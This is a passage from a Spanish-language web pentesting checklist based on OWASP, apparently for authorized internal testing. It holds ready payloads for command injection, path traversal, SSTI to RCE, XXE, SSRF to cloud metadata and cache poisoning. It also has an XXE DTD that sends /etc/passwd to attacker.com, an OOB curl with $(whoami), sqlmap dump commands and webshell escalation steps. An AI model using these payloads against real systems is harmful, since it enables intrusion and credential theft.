| Python (pickle) | `\x80\x04` · `\x80\x05` |
| .NET | `AAEAAAD` (Base64) |
| Ruby (Marshal) | `\x04\x08` |

### 2. Modificación de objetos serializados

- [ ] Modificar atributos del objeto serializado para alterar valores sensibles: nombre de usuario, rol, permisos, flags de administrador.

> 💡 **Herramienta:** [SerializationDumper](https://github.com/NickstaDB/SerializationDumper) para objetos Java.

### 3. Inyección de objetos arbitrarios en PHP

- [ ] Verificar si la aplicación PHP deserializa entrada controlada con `unserialize()`.
- [ ] Generar gadget chains con **phpggc**:
  ```bash
  phpggc -l
  phpggc Laravel/RCE1 system 'id' -b
  ```

### 4. Explotación de deserialización Java

- [ ] Generar gadget chains con **ysoserial**:
  ```bash
  java -jar ysoserial.jar CommonsCollections6 'id' | base64
  ```



## 📌 NoSQL Injection

### 1. Identificación del motor NoSQL

- [ ] Identificar si la aplicación usa NoSQL y qué motor: **MongoDB**, **CouchDB**, **Redis**, **Cassandra**.

### 2. Detección de NoSQL Injection

- [ ] Probar en todos los parámetros — especialmente en body JSON (`Content-Type: application/json`):
  ```javascript
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$gt": ""}, "password": {"$gt": ""}}
  {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
  ```

### 3. Bypass de login con NoSQL Injection

- [ ] Probar bypass mediante operadores de comparación:
  ```
  username=admin&password[$ne]=wrongpassword
  username[$ne]=&password[$ne]=
  ```

### 4. Extracción de datos con NoSQL Injection

- [ ] Usar el operador `$regex` para extraer datos carácter a carácter:
  ```json
  {"username": "admin", "password": {"$regex": "^a"}}
  ```



## 📌 Command Injection

### 1. Identificación de puntos de entrada

- [ ] Identificar parámetros que interactúen con el SO: funciones de red (ping, nslookup), conversión de ficheros, envío de emails, rutas de fichero.

### 2. Separadores de comandos

- [ ] Probar separadores: `; | || && `` $()` (Linux) · `& | || &&` (Windows)

### 3. Command Injection simple

- [ ] Verificar si la salida del comando se refleja en la respuesta HTTP:
  ```bash
  ; id
  ; whoami
  ; cat /etc/passwd
  ```

### 4. Blind CI — Retrasos temporales

- [ ] Verificar mediante retrasos en el tiempo de respuesta:
  ```bash
  ; sleep 5
  & ping -n 6 127.0.0.1
  ```

### 5. Blind CI — Redirección de salida

- [ ] Redirigir la salida del comando a un fichero accesible via HTTP:
  ```bash
  ; id > /var/www/html/output.txt
  ```

### 6. Blind CI — Interacción OOB

- [ ] Confirmar la ejecución mediante interacción out-of-band:
  ```bash
  ; curl https://collaborator-id.oastify.com/$(whoami)
  ```

### 7. Bypass de filtros

- [ ] Probar técnicas de bypass: `${IFS}`, comillas, encoding, wildcards.

> 💡 **Herramienta:** [commix](https://github.com/commixproject/commix)



## 📌 Path Traversal

### 1. Identificación de puntos de entrada

- [ ] Identificar parámetros que referencien ficheros: `file=`, `path=`, `page=`, `include=`, `template=`, `img=`, `doc=`, `load=`, `filename=`

### 2. Payloads básicos (sin codificación)

- [ ] Probar con diferentes profundidades de traversal:
  ```
  ../../../etc/passwd
  ../../../../../etc/passwd
  ```

### 3. Null Byte Poisoning (%00)

- [ ] Probar para truncar extensiones forzadas por la aplicación:
  ```
  ../../../etc/passwd%00.png
  ../../../etc/passwd%00.jpg
  ```

### 4. Doble punto con slash redundante (....// )

- [ ] Bypass de filtros que eliminan `../`:
  ```
  ....//....//....//etc/passwd
  ```

### 5. Doble codificación URL (%252e%252e%252f)

- [ ] Bypass cuando la aplicación decodifica solo una vez:
  ```
  ..%252f..%252f..%252fetc/passwd
  ```

### 6. Encoding de slash y backslash

- [ ] Probar con slash codificado: `..%2f..%2f..%2fetc/passwd`
- [ ] Probar con backslash (Windows): `..\..\..\windows\win.ini` · `..%5c..%5c`

### 7. Unicode y UTF-8 encoding

- [ ] Probar variantes Unicode de slash: `..%c0%af..%c0%af..%c0%afetc/passwd`

### 8. Rutas absolutas combinadas con traversal

- [ ] Probar: `/var/www/images/../../../etc/passwd`
- [ ] Probar rutas absolutas directas: `/etc/passwd`, `/etc/shadow`

### 9. Ficheros objetivo según el sistema operativo

**Linux:**


```
/etc/passwd · /etc/shadow · /proc/self/environ
~/.ssh/id_rsa · /var/log/apache2/access.log


```

**Windows:**


```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\inetpub\wwwroot\web.config


```

### 10. Verificación del impacto

- [ ] Escalar a ficheros de configuración con credenciales: `.env`, `config.php`, `database.yml`, `web.config`
- [ ] Intentar leer claves privadas SSH del usuario bajo el que corre el servidor web.
- [ ] Verificar si el traversal permite escritura — si es así, escalar a RCE escribiendo un webshell.



## 📌 Prototype Pollution

> 💡 **Nota:** El impacto depende de encontrar gadgets — fragmentos de código que usen propiedades del prototipo contaminado para ejecutar acciones sensibles.

### 1. Prototype Pollution en cliente — via APIs

- [ ] Probar contaminación del prototipo via query string:
  ```
  https://target.com/?__proto__[foo]=bar
  https://target.com/?constructor[prototype][foo]=bar
  ```
- [ ] Verificar en la consola del navegador: `Object.prototype.foo`

> 💡 **Herramienta:** DOM Invader (Burp Suite)

### 2. XSS en el DOM por Prototype Pollution en cliente

- [ ] Probar gadgets que deriven en XSS:
  ```
  ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
  ?__proto__[src]=data:,alert(1)
  ```

**Lab de referencia:** Client-side prototype pollution via browser APIs → XSS via DOM.

### 3. XSS en el DOM por vector alternativo de Prototype Pollution

- [ ] Probar vectores alternativos cuando `__proto__` está filtrado:
  ```
  ?constructor[prototype][foo]=bar
  ?__pro%74o__[foo]=bar
  {"__proto__": {"foo": "bar"}}
  ```

**Lab de referencia:** Client-side prototype pollution via alternate vector → DOM XSS.

### 4. Prototype Pollution en servidor (Node.js)

- [ ] Probar contaminación en body JSON:
  ```json
  {"__proto__": {"isAdmin": true}}
  ```



## 📌 SSRF

### 1. Identificación de puntos de entrada

- [ ] Identificar parámetros que acepten URLs: `url=`, `fetch=`, `redirect=`, `src=`, `webhookUrl=`, `callback=`

### 2. SSRF básico contra el servidor local

- [ ] Probar peticiones a localhost:
  ```
  url=http://localhost/admin
  url=http://127.0.0.1/admin
  url=http://[::1]/admin
  url=http://2130706433/admin
  ```

### 3. SSRF básico contra sistemas internos

- [ ] Escanear la red interna y enumerar puertos: `3306` (MySQL), `6379` (Redis), `27017` (MongoDB), `9200` (Elasticsearch)

### 4. SSRF contra metadata de cloud

- [ ] Probar acceso a endpoints de metadata:
  ```
  url=http://169.254.169.254/latest/meta-data/          # AWS
  url=http://metadata.google.internal/computeMetadata/v1/  # GCP
  url=http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
  ```

### 5. SSRF Blind — Detección OOB

- [ ] Confirmar ejecución via Burp Collaborator o interactsh:
  ```
  url=https://collaborator-id.oastify.com
  ```

### 6. SSRF con bypass de filtro blacklist

- [ ] Probar representaciones alternativas de localhost:
  ```
  http://127.1
  http://0177.0.0.1
  http://0x7f000001
  http://127.0.0.1.nip.io
  ```

### 7. SSRF con bypass de filtro whitelist

- [ ] Probar técnicas de bypass de whitelist:
  ```
  https://allowed-domain.com@evil.com
  https://evil.allowed-domain.com
  https://evil.com/?allowed-domain.com
  ```

### 8. SSRF embebido en formatos de datos

- [ ] Verificar SSRF en XML (XXE → SSRF), SVG subidos y HTML procesado para generar PDFs.



## 📌 SSTI

### 1. Identificación de puntos de entrada

- [ ] Identificar campos renderizados por un motor de plantillas: mensajes de error, campos de perfil, parámetros reflejados en la página, asunto de emails.

### 2. Payload de detección universal

- [ ] Probar en todos los puntos de entrada:
  ```
  {{7*7}}    ${7*7}    <%= 7*7 %>    #{7*7}    *{7*7}    {{7*'7'}}
  ```

### 3. Identificación del motor de plantillas

| Payload | Resultado | Motor |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2 / Twig |
| `{{7*'7'}}` | 49 | Jinja2 |
| `{{7*'7'}}` | 7777777 | Twig |
| `${7*7}` | 49 | Freemarker / Smarty |
| `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `*{7*7}` | 49 | Thymeleaf |

### 4. Escalada a RCE

- [ ] Una vez identificado el motor, probar ejecución de comandos:
  ```python
  # Jinja2
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  
  # Twig
  {{['id']|filter('system')}}
  
  # Freemarker
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
  
  # ERB
  <%= system('id') %>
  ```

> 💡 **Herramienta:** [tplmap](https://github.com/epinna/tplmap)



## 📌 SQL Injection

> **Nota:** La detección está cubierta por **Acunetix** y la explotación por **sqlmap**. Esta sección se centra en detección manual y casos con puntos ciegos para las herramientas automáticas.

### 1. Dónde buscar

- [ ] No limitar la búsqueda a parámetros GET/POST visibles. Verificar también en:
  - **Cookies** · **Cabeceras HTTP** (`User-Agent`, `Referer`, `X-Forwarded-For`)
  - **Campos de ordenación y paginación** (`ORDER BY`, `LIMIT`, `offset=`)
  - **Campos de búsqueda** · **Parámetros de API REST** · **Campos ocultos de formularios**

### 2. Detección manual

- [ ] Inyectar caracteres que puedan romper la query SQL: `'` `''` `"` `;` `-- -` `#`
- [ ] Probar condiciones booleanas:
  ```sql
  1 AND 1=1    → respuesta normal
  1 AND 1=2    → respuesta diferente → blind SQLi confirmado
  ```
- [ ] Probar time-based:
  ```sql
  1' AND SLEEP(5)--         # MySQL
  1; WAITFOR DELAY '0:0:5'-- # MSSQL
  1' AND pg_sleep(5)--       # PostgreSQL
  ```

### 3. Tipos de SQL Injection

| Tipo | Descripción | Detección |
|---|---|---|
| Error-based | El error de la BD se muestra en la respuesta | Mensaje de error al inyectar `'` |
| Blind boolean | La respuesta varía según la condición | Diferencia entre `AND 1=1` y `AND 1=2` |
| Blind time-based | Sin diferencia en respuesta, solo en tiempo | Retraso con `SLEEP(5)` |
| Out-of-band | Exfiltración via DNS/HTTP externo | Interacción en Burp Collaborator |
| Second-order | Payload almacenado, ejecutado en otro contexto | Acunetix no lo detecta — revisión manual |

### 4. Second-Order SQL Injection

- [ ] Registrar una cuenta con payload SQL en el nombre de usuario: `admin'--`
- [ ] Realizar la acción secundaria y verificar si el payload se ejecuta.

> ⚠️ **Nota:** Acunetix no detecta Second-Order SQLi — esta prueba debe realizarse siempre manualmente.

### 5. Explotación con sqlmap


```bash
# Detección básica GET
sqlmap -u "https://target.com/item?id=1" --batch

# Detección POST desde fichero Burp
sqlmap -r request.txt --batch

# Enumerar bases de datos
sqlmap -u "https://target.com/item?id=1" --dbs --batch

# Extraer datos de una tabla
sqlmap -u "https://target.com/item?id=1" -D nombre_db -T nombre_tabla --dump --batch

# Bypass de WAF
sqlmap -u "https://target.com/item?id=1" --tamper=space2comment --batch
sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --batch


```



## 📌 Transmisión Segura

### 1. Análisis de la configuración SSL/TLS

- [ ] Ejecutar **testssl.sh** contra el target:
  ```bash
  testssl.sh https://target.com
  testssl.sh --full https://target.com
  ```
- [ ] Verificar las categorías de cifrado (OK, WEAK, INSECURE).
- [ ] Identificar suites de cifrado inseguras: `RC4`, `DES`, `3DES`, `NULL`, `EXPORT`, `anon`, claves < 128 bits, sin Forward Secrecy.
- [ ] Verificar que TLS 1.0 y TLS 1.1 están desactivados.
- [ ] Verificar que SSLv2 y SSLv3 están completamente desactivados.

### 2. Transmisión de información sensible

- [ ] Verificar que las credenciales se transmiten únicamente por HTTPS.
- [ ] Verificar que los tokens de sesión, JWT y cookies de autenticación se transmiten únicamente por HTTPS.
- [ ] Verificar que la información sensible no se transmite en la URL como query parameter.



## 📌 XXE

### 1. Identificación de puntos de entrada

- [ ] Identificar dónde la aplicación procesa XML: SOAP, `Content-Type: application/xml`, ficheros subidos (DOCX, XLSX, SVG, PDF), feeds RSS/Atom.
- [ ] Verificar si el parser acepta DOCTYPE:
  ```xml
  <?xml version="1.0"?><!DOCTYPE test []><root>test</root>
  ```

### 2. XXE via Content-Type switching

- [ ] Cambiar `Content-Type: application/json` a `application/xml` en endpoints JSON.

### 3. XXE con entidades externas

- [ ] Probar lectura de ficheros locales:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root><data>&xxe;</data></root>
  ```

### 4. XXE para ataques SSRF

- [ ] Usar XXE para forzar peticiones internas:
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
  ```

### 5. XXE Blind — Interacción OOB

- [ ] Confirmar via Burp Collaborator:
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://collaborator-id.oastify.com">]>
  ```

### 6. XXE Blind — Parameter Entities


```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://collaborator-id.oastify.com">
  %xxe;
]>


```

### 7. XXE Blind — Exfiltración via DTD externa

**evil.dtd en servidor atacante:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?data=%file;'>">
%eval; %exfil;


```

**Payload:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd"> %xxe;]>


```

### 8. XXE Blind — Mensajes de error


```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval; %error;
]>


```

### 9. XInclude para leer archivos


```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>


```

### 10. XXE via SVG


```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>


```

### 11. XXE usando DTD local


```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
    &#x25;eval; &#x25;error;
  '>
  %local_dtd;
]>


```

> 💡 **Tip:** DTDs locales comunes: `/usr/share/yelp/dtd/docbookx.dtd` · `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`



## 📌 Web Cache Poisoning

### 1. Detección del sistema de caché

- [ ] Verificar cabeceras de respuesta: `X-Cache`, `CF-Cache-Status`, `Age`, `Via`, `X-Varnish`
- [ ] Usar cache buster para obtener respuestas frescas: `GET /page?cb=12345`

### 2. Identificación de claves de caché (cache keys)

- [ ] Usar el plugin **Param Miner** de Burp Suite:
  - `Extensions → Param Miner → Guess headers`
  - `Extensions → Param Miner → Guess params`

### 3. WCP con cabecera no indexada

- [ ] Inyectar valor malicioso en cabecera excluida de la cache key:
  ```http
  GET / HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com
  ```

### 4. WCP con cookie no indexada

- [ ] Inyectar payload en cookie excluida de la cache key:
  ```http
  Cookie: lang=es"><script>alert(1)</script>
  ```

### 5. WCP con múltiples cabeceras HTTP

- [ ] Probar combinaciones de cabeceras que juntas fuercen el efecto deseado:
  ```http
  X-Forwarded-Host: evil.com
  X-Forwarded-Scheme: http
  ```

### 6. WCP con cabecera desconocida

- [ ] Probar cabeceras menos conocidas: `X-Original-URL`, `X-Rewrite-URL`, `X-Host`, `X-Forwarded-Server`

### 7. WCP mediante Parameter Cloaking

- [ ] Explotar inconsistencias en el parseo de query parameters:
  ```
  GET /path?param=value&utm_content=xxx;injected=payload HTTP/1.1
  GET /path?utm_content=x;param=payload HTTP/1.1
  ```

### 8. WCP mediante Fat GET Request

- [ ] Verificar si el servidor acepta body en peticiones GET:
  ```http
  GET /?param=legit HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  param=evil_payload_here
  ```



*Web Application Pentesting Checklist · OWASP WSTG + OWASP Top 10 + OWASP API Security Top 10 · Uso interno*
